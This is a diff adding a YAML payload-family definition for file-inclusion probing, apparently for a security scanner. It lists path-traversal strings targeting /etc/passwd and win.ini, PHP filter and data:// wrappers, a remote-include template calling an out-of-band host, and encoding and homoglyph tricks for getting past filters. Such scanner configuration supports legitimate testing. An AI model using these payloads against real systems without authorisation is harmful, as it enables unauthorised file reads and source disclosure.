@@ -1,0 +1,52 @@
+family_id: lfi_rfi
+description: >-
+  Local and Remote File Inclusion probes covering UNIX and Windows path
+  contexts plus PHP wrapper variants. Read-only seeds — no write/delete
+  primitives. Remote-include destinations rely on an OAST-supplied host.
+cwe_ids: [22, 98]
+owasp_top10:
+  - 'A01:2021'
+  - 'A03:2021'
+risk_level: medium
+requires_approval: false
+oast_required: true
+payloads:
+  - id: unix_passwd
+    template: '../../../../etc/passwd'
+    confidence: likely
+    notes: Canonical Unix LFI probe; differential vs control file confirms read.
+  - id: windows_hosts
+    template: '..\\..\\..\\..\\windows\\win.ini'
+    confidence: likely
+    notes: Windows variant; uses backslash separators.
+  - id: nullbyte_passwd
+    template: '../../../../etc/passwd%00'
+    confidence: suspected
+    notes: NULL-byte truncation (legacy PHP); rarely effective on modern stacks.
+  - id: php_filter_b64
+    template: 'php://filter/convert.base64-encode/resource=index.php'
+    confidence: likely
+    notes: PHP wrapper to leak source as base64 (PHP-specific).
+  - id: rfi_oast
+    template: 'http://{oast_host}/{canary}.txt'
+    confidence: confirmed
+    notes: Remote include via OAST host; DNS callback confirms RFI.
+  - id: data_uri
+    template: 'data://text/plain;base64,e2NhbmFyeX0='
+    confidence: suspected
+    notes: data:// wrapper; tests includer that follows arbitrary schemes.
+mutations:
+  - name: case_flip
+    description: Mixed-case scheme/file names defeat lowercase-only filters.
+  - name: unicode_homoglyph
+    description: Cyrillic look-alikes for hostname filters in RFI variants.
+encodings:
+  - name: identity
+    stages: []
+    description: Raw payload (path / include contexts).
+  - name: url_only
+    stages: [url]
+    description: URL-encoded; required for query-string sinks.
+  - name: url_double
+    stages: [url_double]
+    description: Double URL-encoded; bypasses one-pass-decoding gateways.
